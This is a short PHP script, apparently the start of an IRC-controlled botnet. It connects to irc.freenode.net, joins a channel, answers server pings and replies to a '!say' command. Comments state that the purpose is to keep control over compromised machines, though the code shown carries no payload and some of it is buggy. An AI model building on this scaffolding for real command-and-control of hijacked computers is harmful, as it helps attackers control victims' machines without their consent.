<?php

//Keep script running! 
// The default time limit is 30 seconds.
set_time_limit(0); 
ini_set('display_errors', 'on'); // We can see the output from the server.



//Open socket to Freenode IRC Network.
$socket = fsockopen("irc.freenode.net", 6667);

// Send text to the server: fputs();
// fputs(socket variable aka where data needs to go, text that needs to be sent goes here.\n);
// Remember \n newline at end of each message to server, this seperates commands  so instead of /nick thisnick /identify it becomes
// /nick thisnick 
// /identify fefeafeaf


// Each bot joining the channel needs a unique for us to keep control over the compromised machine.
//The following code solves the problem. (I hope.)
//$rand = getrandmax();
//$nick = md5($rand);


fputs($socket, "NICK PHPBotNet\n");
fputs($socket,"USER PHPBotNet anapnea.net PHPBotNet :kurtcc bruno\n"); //(nick host nick:realname)

// Join the channel of choice.
// This variable should later be coded to be easily alternated
// as well as the server.

fputs($socket,"JOIN #Win33\n"); // 

while(1) { // Until one decides to change its value this script will stay running.

// fgets() function returns text the server is sending us. We then store the text received from the server into a variable.
	while($data = fgets($socket,128)) {
		echo nl2br($data);
		flush();

		// Seperate the strings we receive from the server. Use explode() function for this.
		// Data seperated by explode() function will be saved into an array named $ex
		$ex = explode( ' ' , $data);

		//Gonna receive ping with unique code, send back pong + unique code
		if($ex[0] == "PING") {
			fputs($socket, "PONG".$ex[1]."\n");
		}
			// Say something in the channel
		$command = str_replace(array(chr(10), chr(13)), '', $ex[3]);
		if ($command == ":!say") {
			fputs($socket, "PRIVMSG ".$ex[2]." Hello World!\n");




		}
	}


}

?>


